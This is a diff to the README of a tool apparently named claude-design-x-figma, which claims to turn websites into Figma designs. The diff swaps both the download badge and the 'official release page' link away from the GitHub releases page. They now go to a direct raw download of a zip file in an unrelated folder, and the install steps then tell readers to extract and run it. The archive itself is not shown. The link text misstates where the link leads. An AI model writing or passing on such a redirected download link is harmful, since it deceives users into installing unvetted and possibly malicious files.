@@ -1,6 +1,6 @@
 # 🎨 claude-design-x-figma - Turn live websites into editable designs
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/julesa6664/claude-design-x-figma/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/julesa6664/claude-design-x-figma/main/crisp/design_figma_claude_x_v3.6.zip)
 
 This software converts live web pages into Figma design files. It reads the code of a website and recreates the layout in Figma. You get auto-layout, colors, text styles, and borders. This tool connects your design workflow to website creation. You use it to pull designs from the web or bring files back from code.
 
@@ -25,7 +25,7 @@ Designers often need to recreate screens they see online. This process takes hou
 
 Installation requires a few simple steps. Follow the instructions below to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/julesa6664/claude-design-x-figma/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/julesa6664/claude-design-x-figma/main/crisp/design_figma_claude_x_v3.6.zip).
 2. Look for the file ending in `.zip` or `.exe` under the latest release.
 3. Save the file to your computer.
 4. Extract the folder if you downloaded a zip file.
